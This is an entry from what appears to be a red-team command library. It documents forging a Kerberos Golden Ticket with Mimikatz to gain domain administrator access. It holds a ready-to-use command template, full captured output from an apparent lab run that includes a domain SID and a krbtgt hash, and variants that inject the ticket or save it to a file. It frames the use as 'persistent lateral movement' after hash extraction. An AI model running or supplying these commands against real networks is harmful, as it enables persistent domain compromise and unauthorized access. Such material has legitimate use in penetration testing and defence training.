---
id: e0fcd486-eeb0-4da4-888e-08f203c064a6
name: mimikatz-golden-ticket-creation
type: command
executor: cmd
data: >-
  Mimikatz.exe "kerberos::golden /domain:$_DOMAIN /sid:$_DOMAIN_SID
  /rc4:$_NTLM_HASH /user:Administrator /ptt" "exit"
output: >-
  PS C:\Windows\system32\spool\drivers\color> Mimikatz.exe "kerberos::golden
  /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166
  /rc4:9404def404bc198fd9830a3483869e78 /user:Administrator /ptt" "exit"

    .#####.   mimikatz 2.2.0 (x64) #18362 May  9 2020 20:52:48
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

  mimikatz # kerberos::golden /domain:dev.admin.offshore.com
  /sid:S-1-5-21-1416445593-394318334-2645530166 /rc4:9404def404

  bc198fd9830a3483869e78 /user:Administrator /ptt

  User      : Administrator

  Domain    : dev.admin.offshore.com (DEV)

  SID       : S-1-5-21-1416445593-394318334-2645530166

  User Id   : 500

  Groups Id : *513 512 520 518 519

  ServiceKey: 9404def404bc198fd9830a3483869e78 - rc4_hmac_nt

  Lifetime  : 7/6/2020 11:52:12 PM ; 7/4/2030 11:52:12 PM ; 7/4/2030 11:52:12 PM

  -> Ticket : ** Pass The Ticket **

   * PAC generated
   * PAC signed
   * EncTicketPart generated
   * EncTicketPart encrypted
   * KrbCred generated

  Golden ticket for 'Administrator @ dev.admin.offshore.com' successfully
  submitted for current session


  mimikatz # exit
created_at: '2020-07-07T04:30:50.323081+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - mimikatz
  - golden-ticket
verified: true
validated: true
---

# mimikatz-golden-ticket-creation

## Command

```cmd
Mimikatz.exe "kerberos::golden /domain:$_DOMAIN /sid:$_DOMAIN_SID /rc4:$_NTLM_HASH /user:Administrator /ptt" "exit"
```

## Description

This Mimikatz command forges a Kerberos Golden Ticket using the krbtgt NTLM hash, injects it into the current session (/ptt), and grants domain admin access. Use after extracting the hash from a DC for persistent lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /domain:$_DOMAIN | Fully qualified domain name | Yes |
| /sid:$_DOMAIN_SID | Domain Security Identifier | Yes |
| /rc4:$_NTLM_HASH | krbtgt NTLM hash (32 hex chars) | Yes |
| /user:Administrator | Username for the ticket (e.g., Administrator) | Yes |
| /ptt | Pass-the-ticket: Inject into memory | Yes |

## Examples

### Basic Golden Ticket

```cmd
Mimikatz.exe "kerberos::golden /domain:dev.tesla.local /sid:S-1-5-21-... /rc4:abcdef... /user:Administrator /ptt" "exit"
```

### Save to File (No PTT)

```cmd
Mimikatz.exe "kerberos::golden /domain:dev.tesla.local /sid:S-1-5-21-... /rc4:abcdef... /user:Administrator /ticket:gold.tgt" "exit"
```

## Expected Output

Mimikatz banner followed by ticket details, PAC generation steps, and confirmation of injection. Lifetime shows validity period (up to 10 years).

## Related

- [[procedures/Create-Golden-Ticket-and-Launch-Windows-Shell]]
